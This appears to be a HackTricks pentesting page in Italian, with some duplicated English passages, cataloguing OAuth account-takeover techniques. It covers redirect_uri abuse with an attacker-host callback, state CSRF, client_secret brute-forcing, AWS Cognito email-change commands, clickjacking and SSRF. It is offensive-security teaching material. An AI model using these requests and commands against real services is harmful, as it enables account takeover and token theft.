# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Informazioni di base <a href="#d4a8" id="d4a8"></a>

OAuth offre varie versioni, con approfondimenti fondamentali disponibili su [OAuth 2.0 documentation](https://oauth.net/2/). Questa trattazione si concentra principalmente sul diffuso [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), fornendo un **framework di autorizzazione che permette a un'applicazione di accedere o eseguire azioni sull'account di un utente in un'altra applicazione** (the authorization server).

Considera un sito ipotetico _**https://example.com**_, progettato per **mostrare tutti i tuoi post sui social media**, inclusi quelli privati. Per farlo si utilizza OAuth 2.0. _https://example.com_ chiederà il tuo permesso per **accedere ai tuoi post sui social media**. Di conseguenza, su _https://socialmedia.com_ comparirà una schermata di consenso che illustra i **permessi richiesti e lo sviluppatore che effettua la richiesta**. Dopo la tua autorizzazione, _https://example.com_ ottiene la possibilità di **accedere ai tuoi post per tuo conto**.

È essenziale comprendere i seguenti componenti nel framework OAuth 2.0:

- **resource owner**: Tu, in quanto **utente/entità**, autorizzi l'accesso alla tua risorsa, come i post del tuo account social.
- **resource server**: Il **server che gestisce le richieste autenticate** dopo che l'applicazione ha ottenuto un `access token` per conto del `resource owner`, p.es., **https://socialmedia.com**.
- **client application**: L'**applicazione che richiede l'autorizzazione** al `resource owner`, come **https://example.com**.
- **authorization server**: Il **server che emette `access tokens`** al `client application` dopo l'autenticazione del `resource owner` e l'ottenimento dell'autorizzazione, p.es., **https://socialmedia.com**.
- **client_id**: Un identificatore pubblico e univoco per l'applicazione.
- **client_secret:** Una chiave riservata, nota solo all'applicazione e all'authorization server, usata per generare `access_tokens`.
- **response_type**: Un valore che specifica **il tipo di token richiesto**, come `code`.
- **scope**: Il **livello di accesso** che il `client application` sta richiedendo al `resource owner`.
- **redirect_uri**: L'**URL verso cui l'utente viene reindirizzato dopo l'autorizzazione**. Tipicamente deve corrispondere all'URL di redirect pre-registrato.
- **state**: Un parametro per **mantenere dati durante il reindirizzamento dell'utente da e verso l'authorization server**. La sua unicità è critica per fungere da **meccanismo di protezione CSRF**.
- **grant_type**: Un parametro che indica **il tipo di grant e il tipo di token da restituire**.
- **code**: Il codice di autorizzazione fornito dall'authorization server, usato insieme a `client_id` e `client_secret` dal client application per ottenere un `access_token`.
- **access_token**: Il **token che il client application usa per le richieste API** per conto del `resource owner`.
- **refresh_token**: Permette all'applicazione di **ottenere un nuovo `access_token` senza richiedere nuovamente il consenso dell'utente**.

### Flusso

L'**effettivo flusso OAuth** procede come segue:

1. Visiti [https://example.com](https://example.com) e clicchi sul pulsante “Integrate with Social Media”.
2. Il sito invia quindi una richiesta a [https://socialmedia.com](https://socialmedia.com) chiedendo la tua autorizzazione per consentire all'applicazione di https://example.com di accedere ai tuoi post. La richiesta è strutturata come:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Ti viene quindi mostrata una pagina di consenso.
4. Dopo la tua approvazione, Social Media invia una risposta al `redirect_uri` con i parametri `code` e `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com usa questo `code`, insieme al suo `client_id` e `client_secret`, per effettuare una richiesta lato server per ottenere un `access_token` per tuo conto, consentendo l'accesso alle autorizzazioni a cui hai acconsentito:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finalmente, il processo si conclude mentre https://example.com utilizza il tuo `access_token` per effettuare una chiamata API a Social Media per accedere

## Vulnerabilità <a href="#id-323a" id="id-323a"></a>

### Redirect aperto redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), il server di autorizzazione deve reindirizzare il browser solo a **URI di redirect esatti e preregistrati**. Qualsiasi debolezza qui permette a un attacker di inviare una vittima tramite un URL di autorizzazione malevolo in modo che l'IdP consegni il `code` (e il `state`) della vittima direttamente a un endpoint dell'attacker, che può poi riscattarlo e ottenere i token.

Tipico flusso d'attacco:

1. Crea `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` e invialo alla vittima.
2. La vittima si autentica e approva gli scope.
3. L'IdP reindirizza a `attacker.tld/callback?code=<victim-code>&state=...` dove l'attacker registra la richiesta e scambia immediatamente il code.

Bug di validazione comuni da verificare:

- **Nessuna validazione** – qualsiasi URL assoluto viene accettato, causando il furto immediato del `code`.
- **Controlli deboli su substring/regex sull'host** – bypass con domini simili come `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, o `match.com@evil.com`.
- **Mismatch con omografi IDN** – la validazione avviene sulla forma punycode (`xn--`), ma il browser reindirizza al dominio Unicode controllato dall'attacker.
- **Percorsi arbitrari su un host consentito** – puntare il `redirect_uri` a `/openredirect?next=https://attacker.tld` o a qualsiasi endpoint XSS/contenuto-utente espone il code tramite redirect concatenati, header Referer o JavaScript iniettato.
- **Vincoli di directory senza normalizzazione** – pattern come `/oauth/*` possono essere bypassati con `/oauth/../anything`.
- **Wildcard sui sottodomini** – accettare `*.example.com` significa che qualsiasi takeover (dangling DNS, S3 bucket, ecc.) fornisce immediatamente un callback valido.
- **Callback non-HTTPS** – lasciare passare URI `http://` dà agli attacker di rete (Wi-Fi, proxy aziendale) l'opportunità di intercettare il code in transito.

Esamina anche parametri aggiuntivi in stile redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, ecc.) e il documento di discovery OpenID (`/.well-known/openid-configuration`) per endpoint aggiuntivi che potrebbero ereditare gli stessi bug di validazione.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Come menzionato in questo bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) potrebbe essere possibile che il redirect **l'URL venga riflesso nella risposta** del server dopo che l'utente si autentica, risultando **vulnerabile a XSS**. Payload possibile da testare:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Gestione impropria del parametro state <a href="#bda5" id="bda5"></a>

The `state` parameter is the Authorization Code flow CSRF token: the client must generate a **cryptographically random value per browser instance**, persist it somewhere only that browser can read (cookie, local storage, etc.), send it in the authorization request, and reject any response that does not return the same value. Whenever the value is static, predictable, optional, or not tied to the user’s session, the attacker can finish their own OAuth flow, capture the final `?code=` request (without sending it), and later coerce a victim browser into replaying that request so the victim account becomes linked to the attacker’s identity provider profile.

Il parametro `state` è il token CSRF dell'Authorization Code flow: il client deve generare un valore **crittograficamente casuale per ogni istanza del browser**, conservarlo in un posto leggibile soltanto da quel browser (cookie, local storage, ecc.), inviarlo nella richiesta di autorizzazione e rifiutare qualsiasi risposta che non ritorni lo stesso valore. Quando il valore è statico, prevedibile, opzionale o non legato alla sessione dell'utente, l'attaccante può completare il proprio OAuth flow, catturare la richiesta finale `?code=` (senza inviarla) e poi costringere il browser della vittima a riprodurre quella richiesta in modo che l'account della vittima venga associato al profilo dell'attaccante presso l'identity provider.

The replay pattern is always the same:

1. The attacker authenticates against the IdP with their account and intercepts the last redirect containing `code` (and any `state`).
2. They drop that request, keep the URL, and later abuse any CSRF primitive (link, iframe, auto-submitting form) to force the victim browser to load it.
3. If the client does not enforce `state`, the application consumes the attacker’s authorization result and logs the attacker into the victim’s app account.

Il pattern di replay è sempre lo stesso:

1. L'attaccante si autentica presso l'IdP con il proprio account e intercetta l'ultimo redirect contenente `code` (e l'eventuale `state`).
2. Scarta quella richiesta, conserva l'URL e successivamente abusa di qualsiasi primitiva CSRF (link, iframe, form che si auto-invia) per forzare il browser della vittima a caricarla.
3. Se il client non applica `state`, l'applicazione consuma il risultato di autorizzazione dell'attaccante e autentica l'attaccante nell'account dell'app della vittima.

A practical checklist for `state` handling during tests:

- **Missing `state` entirely** – if the parameter never appears, the whole login is CSRFable.
- **`state` not required** – remove it from the initial request; if the IdP still issues codes that the client accepts, the defense is opt-in.
- **Returned `state` not validated** – tamper with the value in the response (Burp, MITM proxy). Accepting mismatched values means the stored token is never compared.
- **Predictable or purely data-driven `state`** – many apps stuff redirect paths or JSON blobs into `state` without mixing in randomness, letting attackers guess valid values and replay flows. Always prepend/append strong entropy before encoding data.
- **`state` fixation** – if the app lets users supply the `state` value (e.g., via crafted authorization URLs) and reuses it throughout the flow, an attacker can lock in a known value and reuse it across victims.

Una checklist pratica per la gestione di `state` durante i test:

- **Assenza completa di `state`** – se il parametro non compare mai, tutto il login è soggetto a CSRF.
- **`state` non richiesto** – rimuovilo dalla richiesta iniziale; se l'IdP emette comunque code che il client accetta, la difesa è opt-in.
- **`state` restituito non validato** – manometti il valore nella risposta (Burp, MITM proxy). Accettare valori non corrispondenti significa che il token memorizzato non viene mai confrontato.
- **`state` prevedibile o puramente guidato dai dati** – molte app inseriscono percorsi di redirect o blob JSON in `state` senza mescolare entropia, permettendo agli attaccanti di indovinare valori validi e riprodurre i flow. Aggiungi sempre entropia forte prima o dopo i dati prima di codificarli.
- **Fissazione del `state`** – se l'app permette agli utenti di fornire il valore di `state` (es. tramite URL di autorizzazione costruiti ad hoc) e lo riusa durante il flow, un attaccante può fissare un valore noto e riutilizzarlo su più vittime.

PKCE can complement `state` (especially for public clients) by binding the authorization code to a code verifier, but web clients must still track `state` to prevent cross-user CSRF/account-linking bugs.

PKCE può complementare `state` (soprattutto per i client pubblici) vincolando l'authorization code a un code verifier, ma i web client devono comunque tracciare `state` per prevenire bug di CSRF cross-user o di associazione account.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Attackers can preemptively create an account using the victim's email. If the victim later uses a third-party service for login, the application might inadvertently link this third-party account to the attacker's pre-created account, leading to unauthorized access.
2. **Exploiting Lax OAuth Email Verification**: Attackers may exploit OAuth services that don't verify emails by registering with their service and then changing the account email to the victim's. This method similarly risks unauthorized account access, akin to the first scenario but through a different attack vector.

1. **Senza verifica dell'email durante la creazione dell'account**: Gli attaccanti possono creare preventivamente un account usando l'email della vittima. Se la vittima in seguito usa un servizio di terze parti per il login, l'applicazione potrebbe collegare involontariamente l'account third-party all'account pre-creato dall'attaccante, portando ad accessi non autorizzati.
2. **Sfruttare la scarsa verifica delle email di OAuth**: Gli attaccanti possono sfruttare servizi OAuth che non verificano le email registrandosi con il servizio e poi cambiando l'email dell'account con quella della vittima. Questo metodo comporta un rischio simile di accesso non autorizzato, analogo al primo scenario ma tramite un vettore diverso.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

The `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**. Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** effectively hand that credential to anyone who can download the package. Always inspect public clients by:

- Unpacking the APK/IPA, desktop installer, or Electron app and grepping for `client_secret`, Base64 blobs that decode to JSON, or hard-coded OAuth endpoints.
- Reviewing bundled config files (plist, JSON, XML) or decompiled strings for client credentials.

Il `client_id` è intenzionalmente pubblico, ma il **`client_secret` non deve mai essere recuperabile dagli utenti finali**. Deployments basati su Authorization Code che incorporano il secret in **mobile APKs, desktop clients o single-page apps** consegnano di fatto quella credenziale a chiunque possa scaricare il pacchetto. Ispeziona sempre i public clients attraverso:

- Disimballare l'APK/IPA, l'installer desktop o l'app Electron e cercare (grep) `client_secret`, blob Base64 che decodificano in JSON o endpoint OAuth hard-coded.
- Revisionare i file di configurazione inclusi (plist, JSON, XML) o le stringhe decompilate in cerca di credenziali del client.

Once the attacker extracts the secret they only need to steal any victim authorization `code` (via a weak `redirect_uri`, logs, etc.) to independently hit `/token` and mint access/refresh tokens without involving the legitimate app. Treat public/native clients as **incapable of holding secrets**—they should instead rely on PKCE (RFC 7636) to prove possession of a per-instance code verifier instead of a static secret. During testing, confirm whether PKCE is mandatory and whether the backend actually rejects token exchanges that omit either the `client_secret` **or** a valid `code_verifier`.

Una volta che l'attaccante estrae il secret, gli basta rubare qualsiasi authorization `code` della vittima (tramite un `redirect_uri` debole, log, ecc.) per interrogare indipendentemente `/token` e generare access/refresh tokens senza coinvolgere l'app legittima. Tratta i public/native clients come **incapaci di conservare segreti**—dovrebbero invece affidarsi a PKCE (RFC 7636) per dimostrare il possesso di un code verifier per istanza invece di un secret statico. Durante i test, verifica se PKCE è obbligatorio e se il backend rifiuta effettivamente gli scambi di token che omettono sia il `client_secret` **o** un valido `code_verifier`.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:

Puoi provare a **bruteforce the client_secret** di un service provider presso l'identity provider per cercare di rubare account.\
La richiesta per il BF potrebbe assomigliare a:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Una volta che il client ha il **code and state**, se questi vengono **riflessi nel Referer header** quando naviga verso una pagina diversa, allora è vulnerabile.

### Access Token Stored in Browser History

La garanzia fondamentale dell'Authorization Code grant è che **access tokens never reach the resource owner’s browser**. Quando le implementazioni leak tokens client-side, qualsiasi bug minore (XSS, Referer leak, proxy logging) si trasforma in una compromissione immediata dell'account. Verificare sempre:

- **Tokens in URLs** – se `access_token` appare nella query/fragment, viene memorizzato nella cronologia del browser, nei server logs, negli analytics e nei Referer headers inviati a terze parti.
- **Tokens transiting untrusted middleboxes** – restituire token via HTTP o attraverso debugging/corporate proxies permette agli osservatori di rete di catturarli direttamente.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs espongono i token a ogni script sull'origine (inclusi payload XSS o estensioni malevole).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` mantengono i token a lungo dopo il logout su dispositivi condivisi e sono accessibili via script.

Qualsiasi di queste scoperte di solito fa salire di gravità bug altrimenti “low” (come un bypass CSP o DOM XSS) fino a un completo API takeover perché l'attaccante può semplicemente leggere e riprodurre il leaked bearer token.

### Everlasting Authorization Code

Authorization codes devono essere **short-lived, single-use, and replay-aware**. Durante la valutazione di un flow, cattura un `code` e:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Prova a riscattare il `code` dopo 5–10 minuti; se funziona ancora, la finestra di esposizione per qualsiasi leaked `code` è eccessiva.
- **Test sequential reuse** – invia lo stesso `code` due volte. Se la seconda richiesta restituisce un altro token, gli attaccanti possono clonare le sessioni indefinitamente.
- **Test concurrent redemption/race conditions** – invia due richieste di token in parallelo (Burp intruder, turbo intruder). Emittenti deboli a volte concedono entrambi.
- **Observe replay handling** – un tentativo di riutilizzo non dovrebbe solo fallire ma anche revocare qualsiasi token già emesso da quel `code`. Altrimenti, un replay rilevato lascia attivo il primo token dell'attaccante.

Combinare un `code` che permette replay con qualsiasi `redirect_uri` o bug di logging consente accesso persistente all'account anche dopo che la vittima completa il login legittimo.

### Authorization/Refresh Token not bound to client

Se puoi ottenere l'**authorization code** e usarlo con un client diverso, allora puoi takeover altri account.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Controlla questo post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In questo bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) puoi vedere che il **token** che **AWS Cognito** restituisce all'utente potrebbe avere **sufficienti permessi per sovrascrivere i dati utente**. Di conseguenza, se puoi **cambiare l'email di un utente con un'altra email**, potresti essere in grado di **take over** gli account di altri.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Per informazioni più dettagliate su come abusare di AWS Cognito controlla [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abuso dei token di altre app <a href="#bda5" id="bda5"></a>

Come [**menzionato in questo writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), i flussi OAuth che si aspettano di ricevere il **token** (e non un code) potrebbero essere vulnerabili se non verificano che il token appartenga all'app.

Questo perché un **attaccante** potrebbe creare un'**application supporting OAuth and login with Facebook** (per esempio) nella propria applicazione. Poi, una volta che una **vittima** effettua il login con Facebook nell'**applicazione dell'attaccante**, l'attaccante potrebbe ottenere l'**OAuth token dell'utente fornito alla sua applicazione, e usarlo per effettuare il login nell'OAuth application della vittima utilizzando il token dell'utente vittima**.

> [!CAUTION]
> Pertanto, se l'attaccante riesce a far accedere l'utente alla sua propria OAuth application, sarà in grado di prendere il controllo dell'account della vittima in applicazioni che si aspettano un token e non verificano se il token è stato concesso al loro app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Secondo [**questo writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), era possibile indurre una vittima ad aprire una pagina con un **returnUrl** che punta all'host dell'attaccante. Questa informazione veniva **memorizzata in un cookie (RU)** e in un **passo successivo** il **prompt** avrebbe **chiesto** all'**utente** se voleva concedere l'accesso a quell'host dell'attaccante.

Per bypassare questo prompt era possibile aprire una tab per iniziare il **Oauth flow** che avrebbe impostato questo cookie RU usando il **returnUrl**, chiudere la tab prima che il prompt venisse mostrato, e aprire una nuova tab senza quel valore. In questo modo il **prompt** non informerà sull'host dell'attaccante, ma il cookie sarebbe impostato su di esso, quindi il **token** verrà inviato all'host dell'attaccante nella redirezione.

### Bypass dell'interazione del prompt <a href="#bda5" id="bda5"></a>

Come spiegato in [**questo video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), alcune implementazioni OAuth permettono di indicare il parametro GET **`prompt`** come None (**`&prompt=none`**) per **evitare che agli utenti venga chiesto di confermare** l'accesso tramite un prompt sul web se sono già autenticati sulla piattaforma.

### response_mode

Come [**spiegato in questo video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), potrebbe essere possibile indicare il parametro **`response_mode`** per specificare dove vuoi che il code venga fornito nell'URL finale:

- `response_mode=query` -> Il code è fornito all'interno di un parametro GET: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Il code è fornito all'interno del fragment dell'URL `#code=2397rf3gu93f`
- `response_mode=form_post` -> Il code è fornito all'interno di un form POST con un input chiamato `code` e il valore
- `response_mode=web_message` -> Il code viene inviato in un post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

I dialog di consenso/login OAuth sono bersagli ideali per clickjacking: se possono essere inseriti in frame, un attaccante può sovrapporre grafiche false, nascondere i veri pulsanti e indurre gli utenti ad approvare scope pericolosi o collegare account. Costruisci PoC che:

1. Carichino l'IdP authorization URL dentro un `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Usino posizionamento assoluto/trucchi di opacità per allineare pulsanti falsi con i controlli reali **Allow**/**Approve** nascosti.
3. Opzionalmente pre-impostino parametri (scopes, redirect URI) in modo che l'approvazione rubata favorisca immediatamente l'attaccante.

Durante i test verifica che le pagine dell'IdP emettano `X-Frame-Options: DENY/SAMEORIGIN` o una `Content-Security-Policy: frame-ancestors 'none'` restrittiva. Se nessuna delle due è presente, dimostra il rischio con strumenti come [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) e registra quanto è semplice per una vittima autorizzare l'app dell'attaccante. Per idee di payload aggiuntive vedi [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Secondo [**questo blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), questo è un OAuth flow che permette di eseguire il login in OAuth tramite **username** e **password**. Se durante questo semplice flow viene restituito un **token** con accesso a tutte le azioni che l'utente può eseguire, allora è possibile bypassare la 2FA usando quel token.

### ATO su pagina web che reindirizza basandosi su open redirect al referrer <a href="#bda5" id="bda5"></a>

Questo [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) descrive come è stato possibile abusare di un **open redirect** usando il valore del **referrer** per sfruttare OAuth per un ATO. L'attacco era:

1. La vittima accede alla pagina web dell'attaccante
2. La vittima apre il link malevolo e un opener avvia il Google OAuth flow con `response_type=id_token,code&prompt=none` come parametri aggiuntivi usando come **referrer il sito dell'attaccante**.
3. Nell'opener, dopo che il provider autorizza la vittima, questa viene rimandata al valore del parametro `redirect_uri` (sito della vittima) con un codice 30X che mantiene comunque il sito dell'attaccante nel referer.
4. Il sito della **vittima attiva l'open redirect basandosi sul referrer** reindirizzando l'utente vittima al sito dell'attaccante; poiché il **`respose_type`** era **`id_token,code`**, il code verrà inviato all'attaccante nel **fragment** dell'URL permettendogli di prendere il controllo dell'account dell'utente via Google nel sito della vittima.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **Per ulteriori dettagli di questa tecnica.**

Dynamic Client Registration in OAuth funge da vettore meno ovvio ma critico per vulnerabilità di sicurezza, in particolare per attacchi di **Server-Side Request Forgery (SSRF)**. Questo endpoint permette ai server OAuth di ricevere dettagli sulle client application, inclusi URL sensibili che potrebbero essere sfruttati.

Punti chiave:

- **Dynamic Client Registration** è spesso mappata su `/register` e accetta dettagli come `client_name`, `client_secret`, `redirect_uris`, e URL per loghi o JSON Web Key Sets (JWKs) tramite richieste POST.
- Questa feature aderisce alle specifiche descritte in **RFC7591** e **OpenID Connect Registration 1.0**, che includono parametri potenzialmente vulnerabili a SSRF.
- Il processo di registrazione può esporre involontariamente i server a SSRF in diversi modi:
  - **`logo_uri`**: un URL per il logo della client application che potrebbe essere fetchato dal server, scatenando SSRF o portando a XSS se l'URL è gestito in modo errato.
  - **`jwks_uri`**: un URL al documento JWK del client, che se costruito in modo malevolo può causare richieste outbound dal server verso un server controllato dall'attaccante.
  - **`sector_identifier_uri`**: fa riferimento a un array JSON di `redirect_uris`, che il server potrebbe fetchare, creando un'opportunità di SSRF.
  - **`request_uris`**: elenca gli request URIs consentiti per il client, che può essere sfruttato se il server effettua fetch di questi URI all'inizio del processo di autorizzazione.

Strategia di sfruttamento:

- La SSRF può essere innescata registrando un nuovo client con URL malevoli in parametri come `logo_uri`, `jwks_uri`, o `sector_identifier_uri`.
- Sebbene lo sfruttamento diretto tramite `request_uris` possa essere mitigato da controlli di whitelist, fornire un `request_uri` pre-registrato e controllato dall'attaccante può facilitare SSRF durante la fase di autorizzazione.

## OAuth providers Race Conditions

Se la piattaforma che stai testando è un OAuth provider [**leggi questo per testare possibili Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, il campo `sub` identifica in modo univoco un utente, ma il suo formato varia a seconda dell'Authorization Server. Per standardizzare l'identificazione, alcuni client usano email o user handle. Tuttavia, questo è rischioso perché:

- Alcuni Authorization Server non garantiscono che queste proprietà (come email) rimangano immutabili.
- In certe implementazioni — come **"Login with Microsoft"** — il client si basa sul campo email, che è **controllato dall'utente in Entra ID** e non verificato.
- Un attaccante può sfruttare questo creando la propria organizzazione Azure AD (es. doyensectestorg) e usandola per effettuare un Microsoft login.
- Anche se l'Object ID (memorizzato in `sub`) è immutabile e sicuro, l'affidamento su un campo email mutabile può permettere un account takeover (per esempio, il furto di un account come victim@gmail.com).

## Client Confusion Attack

In un **Client Confusion Attack**, un'app che utilizza l'OAuth Implicit Flow non verifica che l'access token finale sia stato generato specificamente per il proprio Client ID. Un attaccante mette online un sito pubblico che usa l'OAuth Implicit Flow di Google, inducendo migliaia di utenti a fare login e raccogliendo access token destinati al sito dell'attaccante. Se questi utenti hanno anche account su un altro sito vulnerabile che non valida il Client ID del token, l'attaccante può riutilizzare i token raccolti per impersonare le vittime e prendere il controllo dei loro account.

## Scope Upgrade Attack

L'**Authorization Code Grant** prevede comunicazioni server-to-server sicure per la trasmissione dei dati utente. Tuttavia, se l'**Authorization Server** si fida implicitamente di un parametro scope nella Access Token Request (un parametro non definito nell'RFC), un'app malevola potrebbe aumentare i privilegi di un authorization code richiedendo uno scope superiore. Dopo che l'**Access Token** è stato generato, il **Resource Server** deve verificarlo: per i token JWT ciò comporta il controllo della firma JWT e l'estrazione di dati come `client_id` e `scope`, mentre per token stringa casuale il server deve interrogare l'Authorization Server per recuperare i dettagli del token.

## Redirect Scheme Hijacking

Nelle implementazioni OAuth mobile, le app usano **custom URI schemes** per ricevere redirect con Authorization Codes. Tuttavia, poiché più app possono registrare lo stesso scheme su un dispositivo, l'assunzione che solo il client legittimo controlli il redirect URI viene infranta. Su Android, per esempio, un Intent URI come `com.example.app://` viene intercettato in base allo scheme e ai filtri opzionali definiti nell'intent-filter di un'app. Dato che la risoluzione degli intent di Android può essere ampia — specialmente se è specificato solo lo scheme — un attaccante può registrare un'app malevola con un intent filter costruito ad arte per hijackare l'authorization code. Questo può **permettere un account takeover** sia tramite interazione dell'utente (quando più app sono idonee a gestire l'intent) sia tramite tecniche di bypass che sfruttano filtri troppo specifici, come dettagliato nel flowchart di assessment di Ostorlab.

## Riferimenti

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)

{{#include ../banners/hacktricks-training.md}}
